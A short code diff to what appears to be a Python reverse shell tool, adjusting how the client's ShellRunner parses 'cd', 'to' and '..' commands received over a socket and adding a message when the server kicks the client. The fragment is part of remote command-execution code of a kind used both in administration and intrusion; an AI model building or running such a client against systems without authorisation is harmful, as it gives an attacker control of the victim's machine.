@@ -37,11 +37,11 @@ class ShellRunner(object):
     def cmd(data):
         # type: (bytes) -> bytes
         commandstr = data.decode()
-        if commandstr[:2] == 'cd':
+        if commandstr[:3] == 'cd ':
             return ShellRunner.cd(commandstr[3:])
-        if commandstr[:2] == 'to':
+        if commandstr[:3] == 'to ':
             return ShellRunner.to(commandstr[3:])
-        if commandstr[:2] == '..':
+        if commandstr == '..':
             return ShellRunner.dotdot()
 
         if len(data) == 0:
@@ -160,6 +160,7 @@ class ReverseShellClient(object):
     def receive_commands(self):
         data = self.sock.recv(1024)
         if data == SIG_REVERIESH.KILL:
+            print(ascii_format('Sever has kicked client', 93))
             self.quit()
         if data == SIG_REVERIESH.PROMPT:
             self.sock.send(ShellRunner.pack_dict())
